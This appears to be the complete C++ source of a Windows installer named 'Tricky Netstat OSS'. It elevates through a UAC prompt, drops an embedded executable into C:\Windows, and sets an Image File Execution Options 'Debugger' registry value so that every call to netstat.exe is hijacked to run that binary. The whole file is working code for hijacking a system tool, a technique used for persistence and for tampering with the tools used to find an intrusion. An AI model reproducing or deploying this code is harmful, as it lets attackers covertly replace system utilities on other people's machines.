#include <windows.h>
#include <fstream>
#include <iostream>

#include "netpatch_bin.h"

// 判断是否管理员
bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &adminGroup))
    {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    return isAdmin;
}

// 自提权
void RelaunchAsAdmin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    ShellExecuteA(
        NULL,
        "runas",     // 关键：触发 UAC
        path,
        NULL,
        NULL,
        SW_SHOWNORMAL
    );
}

void InlineIFEO() {
    std::wcout << L"[*] IFEO netstat set..." << std::endl;

    const std::wstring subkey =
    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe";

    const std::wstring debuggerPath = L"C:\\Windows\\netpatch.exe";

    HKEY hKey;
    LONG result = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        subkey.c_str(),
        0,
        nullptr,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE,
        nullptr,
        &hKey,
        nullptr
    );

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"[-] RegCreateKeyEx failed: " << result << std::endl;
        std::wcerr << L"[!!] Tricky Netstat OSS install failed!" << std::endl;
        return;
    }

    result = RegSetValueExW(
        hKey,
        L"Debugger",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(debuggerPath.c_str()),
        static_cast<DWORD>((debuggerPath.size() + 1) * sizeof(wchar_t))
    );

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"[-] RegSetValueEx failed: " << result << std::endl;
        std::wcerr << L"[!!] Tricky Netstat OSS install failed!" << std::endl;
        RegCloseKey(hKey);
        return;
    }

    RegCloseKey(hKey);

    std::wcout << L"[+] IFEO netstat set successfully." << std::endl;
}

int main() {
    // 如果不是管理员 → 重新启动
    if (!IsRunAsAdmin()) {
        RelaunchAsAdmin();
        return 0;
    }
    std::cout << "[+] Tricky Netstat OSS will install to replace your netstat!" << std::endl;
    // ===== 已是管理员，执行你的逻辑 =====
    //释放劫持文件
    std::cout << "[*] Release patch file..." << std::endl;
    std::ofstream out("C:\\Windows\\netpatch.exe", std::ios::binary);
    out.write((char*)C__Users_IDlike_CLionProjects_netpatch_cmake_build_debug_mingw_netpatch_exe, C__Users_IDlike_CLionProjects_netpatch_cmake_build_debug_mingw_netpatch_exe_len);
    out.close();
    std::cout << "[+] patch file successfully." << std::endl;

    //劫持
    InlineIFEO();
    std::cout << "[+] patch IFEO successfully." << std::endl;
    std::cout << "Welcome to Tricky Netstat OSS !!!" << std::endl;
    system("pause");
    return 0;
}